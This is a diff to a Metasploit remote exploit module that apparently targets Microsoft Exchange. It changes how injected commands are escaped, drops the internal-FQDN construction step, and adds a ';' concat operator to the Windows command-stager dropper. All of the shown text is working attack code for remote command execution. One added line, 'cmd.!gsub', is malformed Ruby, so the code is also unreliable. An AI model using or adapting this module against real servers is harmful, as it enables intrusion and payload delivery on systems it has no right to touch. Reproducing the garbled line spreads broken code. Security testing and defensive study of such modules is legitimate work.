@@ -135,7 +135,7 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def encode_cmd(cmd)
-    cmd.gsub('\\', '\\\\\\')
+    cmd.!gsub('\\', '\\\\\\')
     cmd.gsub('"', '\u0022').gsub('&', '\u0026').gsub('+', '\u002b')
   end
 
@@ -348,11 +348,9 @@ class MetasploitModule < Msf::Exploit::Remote
     # get informations by autodiscover request.
     print_status(message('Sending autodiscover request'))
     server_id, legacy_dn = request_autodiscover(server_name)
-    server_name = "#{server_name}.#{server_id.split('@')[1]}"
 
     print_status("Server: #{server_id}")
     print_status("LegacyDN: #{legacy_dn}")
-    print_status("Internal FQDN: #{server_name}")
 
     # get the user UID using mapi request.
     print_status(message('Sending mapi request'))
@@ -560,7 +558,7 @@ class MetasploitModule < Msf::Exploit::Remote
         print_line(output)
       end
     when :windows_dropper
-      execute_command(generate_cmdstager.join)
+      execute_command(generate_cmdstager(concat_operator: ';').join)
     when :windows_powershell
       cmd = cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true)
       execute_command(cmd)
